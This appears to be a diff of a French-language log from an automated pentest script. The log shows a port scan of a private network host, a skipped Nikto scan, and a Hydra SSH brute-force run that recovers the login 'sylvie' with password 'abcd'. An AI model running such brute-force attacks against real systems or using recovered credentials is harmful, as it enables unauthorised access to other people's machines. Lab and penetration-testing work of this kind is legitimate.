@@ -1,3 +1,13 @@
 Scanning ports on 192.168.1.152...
-Pas de serveur HTTP (port 80) détecté sur la cible.
-Pas de serveur HTTPS (port 443) détecté sur la cible.
+Ports ouverts trouvés sur 192.168.1.152 : 22
+Scanning web services on 192.168.1.152 with Nikto...
+Aucun service HTTP/HTTPS trouvé, skipping Nikto scan.
+Testing SSH login with Hydra on 192.168.1.152...
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-26 18:49:25
+[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
+[DATA] attacking ssh://192.168.1.152:22/
+[22][ssh] host: 192.168.1.152   login: sylvie   password: abcd
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-26 18:49:58
